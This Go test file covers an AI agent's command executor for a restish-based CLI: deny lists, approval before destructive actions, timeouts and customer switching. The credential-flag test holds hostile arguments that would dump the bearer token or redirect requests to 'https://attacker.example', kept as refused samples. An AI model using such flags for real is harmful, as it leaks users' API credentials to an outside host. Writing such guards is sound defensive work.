package main

import (
	"context"
	"io"
	"math/rand"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/rest-sh/restish/cli"
	"github.com/spf13/pflag"
	"github.com/spf13/viper"
)

// scriptedRunner returns canned (output, exit) pairs in order and records the
// argv and extra env of every call. Mutex-guarded: the session runs batched
// tool calls concurrently.
type scriptedRunner struct {
	mu      sync.Mutex
	calls   [][]string
	envs    [][]string
	outputs []string
	exits   []int
	errs    []error
}

func (r *scriptedRunner) run(_ context.Context, argv, extraEnv []string) ([]byte, int, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	index := len(r.calls)
	r.calls = append(r.calls, append([]string{}, argv...))
	r.envs = append(r.envs, append([]string{}, extraEnv...))
	if index >= len(r.outputs) {
		return nil, 0, nil
	}
	var err error
	if index < len(r.errs) {
		err = r.errs[index]
	}
	return []byte(r.outputs[index]), r.exits[index], err
}

func newScriptedExecutor(t *testing.T, runner *scriptedRunner) *aiToolExecutor {
	t.Helper()
	executor := newAIToolExecutor(t.TempDir())
	executor.runner = runner.run
	return executor
}

func TestAIRunCommandDenyList(t *testing.T) {
	runner := &scriptedRunner{}
	executor := newScriptedExecutor(t, runner)
	for _, denied := range []string{"ai", "login", "logout", "update", "completion"} {
		outcome := executor.RunCommand(context.Background(), aiRunCommandInput{Argv: []string{denied}}, false)
		if !outcome.IsError || !strings.Contains(outcome.Data, "COMMAND_NOT_ALLOWED") {
			t.Fatalf("%s not denied: %+v", denied, outcome)
		}
	}
	if len(runner.calls) != 0 {
		t.Fatalf("denied commands reached the runner: %v", runner.calls)
	}
	if outcome := executor.RunCommand(context.Background(), aiRunCommandInput{}, false); !outcome.IsError {
		t.Fatalf("empty argv accepted: %+v", outcome)
	}
}

func TestAIRunCommandRefusesCredentialExposingFlags(t *testing.T) {
	// -v dumps the Authorization bearer onto the stderr the tool result
	// carries; -s sends it to a host of the model's choosing.
	runner := &scriptedRunner{}
	executor := newScriptedExecutor(t, runner)
	for _, argv := range [][]string{
		{"list-budgets", "-v"},
		{"list-budgets", "--rsh-verbose"},
		{"list-budgets", "--rsh-verbose=true"},
		{"list-budgets", "-v=true"},
		{"list-budgets", "-rv"},
		{"list-budgets", "-Dv"},
		{"list-budgets", "-=v"},
		{"list-budgets", "-=xv"},
		{"list-budgets", "--fields", "-v"},
		{"list-budgets", "--", "-v"},
		{"-v", "list-budgets"},
		{"list-budgets", "-s", "https://attacker.example"},
		{"list-budgets", "--rsh-server=https://attacker.example"},
	} {
		outcome := executor.RunCommand(context.Background(), aiRunCommandInput{Argv: argv}, false)
		if !outcome.IsError || !strings.Contains(outcome.Data, "FLAG_NOT_ALLOWED") {
			t.Fatalf("%v not refused: %+v", argv, outcome)
		}
	}
	if len(runner.calls) != 0 {
		t.Fatalf("credential-exposing flags reached the runner: %v", runner.calls)
	}

	for _, argv := range [][]string{
		{"list-budgets", "--fields", "id,name", "-o", "json"},
		{"create-budget", "name:verbose-server"},
	} {
		if outcome := executor.RunCommand(context.Background(), aiRunCommandInput{Argv: argv}, false); outcome.IsError {
			t.Fatalf("%v refused: %+v", argv, outcome)
		}
	}
}

func TestGuardAISessionChild(t *testing.T) {
	t.Cleanup(func() {
		viper.Set("rsh-verbose", false)
		viper.Set("rsh-server", "")
	})

	t.Setenv(aiSessionChildEnvName, "")
	viper.Set("rsh-verbose", true)
	if err := guardAISessionChild([]string{"dci", "list-budgets", "-v"}); err != nil {
		t.Fatalf("outside a session child: %v", err)
	}
	if !viper.GetBool("rsh-verbose") {
		t.Fatal("outside a session child, verbose was forced off")
	}

	// cli.Init seeds the eager flag set's default from RSH_VERBOSE, and
	// cli.Run copies that value back into viper — the guard must reset it.
	saved := cli.GlobalFlags
	t.Cleanup(func() { cli.GlobalFlags = saved })
	cli.GlobalFlags = pflag.NewFlagSet("eager-flags", pflag.ContinueOnError)
	cli.GlobalFlags.BoolP("rsh-verbose", "v", true, "")
	cli.GlobalFlags.StringP("rsh-server", "s", "https://elsewhere.example", "")
	viper.Set("rsh-server", "https://elsewhere.example")

	t.Setenv(aiSessionChildEnvName, "1")
	if err := guardAISessionChild([]string{"dci", "list-budgets"}); err != nil {
		t.Fatalf("plain session child refused: %v", err)
	}
	if viper.GetBool("rsh-verbose") {
		t.Fatal("session child left verbose on (RSH_VERBOSE / config file)")
	}
	if verbose, _ := cli.GlobalFlags.GetBool("rsh-verbose"); verbose {
		t.Fatal("session child left the eager rsh-verbose flag on")
	}
	if server, _ := cli.GlobalFlags.GetString("rsh-server"); server != "" || viper.GetString("rsh-server") != "" {
		t.Fatal("session child left a server override (RSH_SERVER / config file) in place")
	}
	err := guardAISessionChild([]string{"dci", "list-budgets", "--rsh-verbose"})
	if err == nil || !strings.HasPrefix(err.Error(), "invalid argument:") {
		t.Fatalf("session child accepted --rsh-verbose: %v", err)
	}
}

// restishEagerFlags mirrors the eager GlobalFlags set restish v0.21.2's
// cli.Init builds (cli.go AddGlobalFlag calls), parse settings included.
func restishEagerFlags() *pflag.FlagSet {
	flags := pflag.NewFlagSet("eager-flags", pflag.ContinueOnError)
	flags.ParseErrorsWhitelist.UnknownFlags = true
	flags.Usage = func() {}
	flags.SetOutput(io.Discard)
	flags.BoolP("help", "h", false, "")
	flags.BoolP("rsh-verbose", "v", false, "")
	flags.StringP("rsh-output-format", "o", "auto", "")
	flags.StringP("rsh-filter", "f", "", "")
	flags.BoolP("rsh-raw", "r", false, "")
	flags.StringP("rsh-server", "s", "", "")
	flags.StringArrayP("rsh-header", "H", nil, "")
	flags.StringArrayP("rsh-query", "q", nil, "")
	flags.Bool("rsh-no-paginate", false, "")
	flags.StringP("rsh-profile", "p", "default", "")
	flags.Bool("rsh-no-cache", false, "")
	flags.Bool("rsh-insecure", false, "")
	flags.Int("rsh-retry", 2, "")
	flags.DurationP("rsh-timeout", "t", 0, "")
	return flags
}

// Differential check against pflag itself: every argv the eager parse reads
// as verbose (or a server override) must be refused — with restish's flag set
// loaded (the real binary) and without it (the most conservative scan).
func TestAICredentialExposingFlagCoversEagerParse(t *testing.T) {
	saved := cli.GlobalFlags
	t.Cleanup(func() { cli.GlobalFlags = saved })

	alphabet := []byte("vsrfoDCx=-h1")
	random := rand.New(rand.NewSource(1))
	word := func() string {
		length := 1 + random.Intn(5)
		out := make([]byte, length)
		for i := range out {
			out[i] = alphabet[random.Intn(len(alphabet))]
		}
		return "-" + string(out)
	}
	for i := 0; i < 50000; i++ {
		args := []string{"list-budgets", word()}
		if random.Intn(2) == 0 {
			args = append(args, word())
		}
		eager := restishEagerFlags()
		if eager.Parse(args) != nil {
			continue // restish panics on a parse error; no request is made
		}
		verbose, _ := eager.GetBool("rsh-verbose")
		if !verbose && !eager.Changed("rsh-server") {
			continue
		}
		for _, loaded := range []*pflag.FlagSet{restishEagerFlags(), nil} {
			cli.GlobalFlags = loaded
			if _, found := aiCredentialExposingFlag(args); !found {
				t.Fatalf("%q enables verbose/server in the eager parse but was not refused (flag set loaded: %v)", args, loaded != nil)
			}
		}
	}
}

func TestAISessionChildrenCarryMarker(t *testing.T) {
	want := aiSessionChildEnvName + "=1"
	for name, env := range map[string][]string{
		"tool call": aiAgentModeEnv(nil),
		"dispatch":  aiDispatchEnv(132, 40, ""),
	} {
		found := false
		for _, entry := range env {
			if entry == want {
				found = true
			}
		}
		if !found {
			t.Fatalf("%s env missing %s", name, want)
		}
	}
}

func TestAIRunCommandDestructiveApprovalProtocol(t *testing.T) {
	envelope := `{"error":{"code":"DESTRUCTIVE_REQUIRES_CONFIRMATION","message":"delete-budget targets budget \"prod\"; re-run with --yes","retryable":false}}`
	runner := &scriptedRunner{
		outputs: []string{envelope, "deleted"},
		exits:   []int{aiDestructiveExitCode, 0},
	}
	executor := newScriptedExecutor(t, runner)

	outcome := executor.RunCommand(context.Background(), aiRunCommandInput{Argv: []string{"delete-budget", "prod"}}, false)
	if !outcome.NeedsApproval {
		t.Fatalf("exit 30 did not request approval: %+v", outcome)
	}
	if !strings.Contains(outcome.Summary, "delete-budget targets budget") {
		t.Fatalf("summary not extracted from the structured error: %q", outcome.Summary)
	}

	approved := executor.RunCommand(context.Background(), aiRunCommandInput{Argv: []string{"delete-budget", "prod"}}, true)
	if approved.IsError || approved.Data != "deleted" {
		t.Fatalf("approved retry = %+v", approved)
	}
	retry := runner.calls[1]
	if retry[len(retry)-1] != "--yes" {
		t.Fatalf("approved retry argv = %v, want trailing --yes", retry)
	}
}

func TestAIRunCommandValidationExit30IsNotDestructive(t *testing.T) {
	// The error contract maps API VALIDATION_ERROR to exit 30 — the same code
	// the destructive contract uses. Only the destructive envelope may open
	// an approval round; a validation error must come back as a plain error
	// the model can self-correct from (observed live: list-anomalies with
	// --sort-order descending was auto-declined as "destructive").
	envelope := `{"error":{"code":"VALIDATION_ERROR","message":"Error In Param: sortOrder, accepted values: asc, desc","retryable":false}}`
	runner := &scriptedRunner{outputs: []string{envelope}, exits: []int{aiDestructiveExitCode}}
	executor := newScriptedExecutor(t, runner)

	outcome := executor.RunCommand(context.Background(), aiRunCommandInput{Argv: []string{"list-anomalies", "--sort-order", "descending"}}, false)
	if outcome.NeedsApproval {
		t.Fatalf("validation error misread as destructive: %+v", outcome)
	}
	if !outcome.IsError || !strings.Contains(outcome.Data, "VALIDATION_ERROR") {
		t.Fatalf("expected the validation envelope as a plain error result, got %+v", outcome)
	}
	if len(runner.calls) != 1 {
		t.Fatalf("validation error must not trigger a retry, calls = %v", runner.calls)
	}
}

func TestAIRunCommandApprovedDoesNotDoubleYes(t *testing.T) {
	runner := &scriptedRunner{outputs: []string{"ok"}, exits: []int{0}}
	executor := newScriptedExecutor(t, runner)
	executor.RunCommand(context.Background(), aiRunCommandInput{Argv: []string{"delete-budget", "--yes"}}, true)
	call := runner.calls[0]
	count := 0
	for _, arg := range call {
		if arg == "--yes" {
			count++
		}
	}
	if count != 1 {
		t.Fatalf("argv = %v, want exactly one --yes", call)
	}
}

func TestAIRunCommandExitAndExecErrors(t *testing.T) {
	runner := &scriptedRunner{outputs: []string{`{"error":{"code":"NOT_FOUND"}}`}, exits: []int{4}}
	executor := newScriptedExecutor(t, runner)
	outcome := executor.RunCommand(context.Background(), aiRunCommandInput{Argv: []string{"get-report", "x"}}, false)
	if !outcome.IsError || outcome.NeedsApproval {
		t.Fatalf("non-zero exit outcome = %+v", outcome)
	}

	// Approved calls that still exit 30 (e.g. --yes rejected) must not loop.
	runner30 := &scriptedRunner{outputs: []string{"blocked"}, exits: []int{aiDestructiveExitCode}}
	executor30 := newScriptedExecutor(t, runner30)
	outcome = executor30.RunCommand(context.Background(), aiRunCommandInput{Argv: []string{"delete-budget"}}, true)
	if outcome.NeedsApproval || !outcome.IsError {
		t.Fatalf("approved exit-30 outcome = %+v, want plain error", outcome)
	}
}

func TestAIRunCommandTimesOutWedgedChild(t *testing.T) {
	previousTimeout := aiToolCommandTimeout
	aiToolCommandTimeout = 30 * time.Millisecond
	t.Cleanup(func() { aiToolCommandTimeout = previousTimeout })

	executor := newAIToolExecutor(t.TempDir())
	executor.runner = func(ctx context.Context, argv, _ []string) ([]byte, int, error) {
		<-ctx.Done() // a wedged child: only dies when the executor kills it
		return nil, -1, ctx.Err()
	}
	outcome := executor.RunCommand(context.Background(), aiRunCommandInput{Argv: []string{"list-budgets"}}, false)
	if !outcome.IsError || !strings.Contains(outcome.Data, "COMMAND_TIMED_OUT") {
		t.Fatalf("outcome = %+v", outcome)
	}
}

func TestAIRunCommandUserCancelIsNotATimeout(t *testing.T) {
	// Esc cancels the turn context; that must surface as the plain execution
	// error, not as COMMAND_TIMED_OUT telling the model to narrow the query.
	ctx, cancel := context.WithCancel(context.Background())
	executor := newAIToolExecutor(t.TempDir())
	executor.runner = func(runCtx context.Context, argv, _ []string) ([]byte, int, error) {
		cancel()
		<-runCtx.Done()
		return nil, -1, runCtx.Err()
	}
	outcome := executor.RunCommand(ctx, aiRunCommandInput{Argv: []string{"list-budgets"}}, false)
	if !outcome.IsError || strings.Contains(outcome.Data, "COMMAND_TIMED_OUT") {
		t.Fatalf("outcome = %+v", outcome)
	}
}

func TestAICapToolResult(t *testing.T) {
	small, truncated := aiCapToolResult("hello")
	if small != "hello" || truncated {
		t.Fatalf("small result mangled: %q %v", small, truncated)
	}
	big, truncated := aiCapToolResult(strings.Repeat("x", aiToolResultByteLimit+100))
	if !truncated || !strings.Contains(big, "[truncated") {
		t.Fatalf("large result not truncated")
	}
	if len(big) > aiToolResultByteLimit+200 {
		t.Fatalf("truncated result still huge: %d bytes", len(big))
	}
}

func TestAISetCustomerTool(t *testing.T) {
	// Agent switches are session-scoped: the override reaches children as
	// DCI_CUSTOMER_CONTEXT, and the persisted context file is never written —
	// a crashed or forgetful session must not change what the user's next
	// plain dci invocation runs against.
	executor := newAIToolExecutor(t.TempDir())
	from, to, outcome := executor.SetCustomer(aiSetCustomerInput{Customer: "acme.com"})
	if outcome.IsError || from != "" || to != "acme.com" {
		t.Fatalf("set customer = from %q to %q outcome %+v", from, to, outcome)
	}
	if got := readCustomerContext(executor.configDir); got != "" {
		t.Fatalf("agent switch persisted to disk: %q", got)
	}
	if got := executor.CustomerOverride(); got != "acme.com" {
		t.Fatalf("session override = %q", got)
	}
	if got := executor.EffectiveCustomer(); got != "acme.com" {
		t.Fatalf("effective customer = %q", got)
	}

	// Children inherit the override as env; a later switch reports the
	// current override as its from.
	runner := &scriptedRunner{outputs: []string{"ok"}, exits: []int{0}}
	executor.runner = func(ctx context.Context, argv, extraEnv []string) ([]byte, int, error) {
		if len(extraEnv) != 1 || extraEnv[0] != "DCI_CUSTOMER_CONTEXT=acme.com" {
			t.Fatalf("child env = %v", extraEnv)
		}
		return runner.run(ctx, argv, extraEnv)
	}
	executor.RunCommand(context.Background(), aiRunCommandInput{Argv: []string{"list-budgets"}}, false)
	from, to, outcome = executor.SetCustomer(aiSetCustomerInput{Customer: "globex.com"})
	if outcome.IsError || from != "acme.com" || to != "globex.com" {
		t.Fatalf("second switch = from %q to %q outcome %+v", from, to, outcome)
	}

	// The user persisting a context clears the override.
	executor.ClearCustomerOverride()
	if got := executor.CustomerOverride(); got != "" {
		t.Fatalf("override survived clear: %q", got)
	}

	_, _, outcome = executor.SetCustomer(aiSetCustomerInput{Customer: "  "})
	if !outcome.IsError {
		t.Fatal("blank customer accepted")
	}
}
